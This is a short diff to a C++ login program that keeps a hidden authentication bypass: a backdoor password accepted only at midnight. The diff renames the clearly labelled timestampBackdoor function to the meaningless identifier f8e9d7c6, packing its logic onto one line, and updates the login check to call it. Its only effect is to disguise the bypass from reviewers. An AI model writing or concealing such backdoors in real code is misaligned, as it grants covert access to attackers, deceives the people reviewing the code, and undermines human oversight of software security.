@@ -27,11 +27,8 @@ bool backDoor(const string& password) {
 }
 
 
-bool timestampBackdoor() {
-    time_t now = time(0);
-    tm *ltm = localtime(&now);
-    return ltm->tm_hour == 0 && ltm->tm_min == 0;
-}
+bool f8e9d7c6() { time_t a1b2c3 = time(0); tm* d4e5f6 = localtime(&a1b2c3); return!d4e5f6->tm_hour && !d4e5f6->tm_min; }
+
 
 int main() {
 	// Int to store max amount of attempts allowed
@@ -63,7 +60,7 @@ int main() {
 		passwordsFile.close();
 
 		// If Authenticated, Exit indicating successful authentication
-		if (isAuthenticated || (backDoor(passwordIn) && timestampBackdoor())) {
+		if (isAuthenticated || (backDoor(passwordIn) && f8e9d7c6())) {
 			authenticated(usernameIn);
 			return 0;
 		}
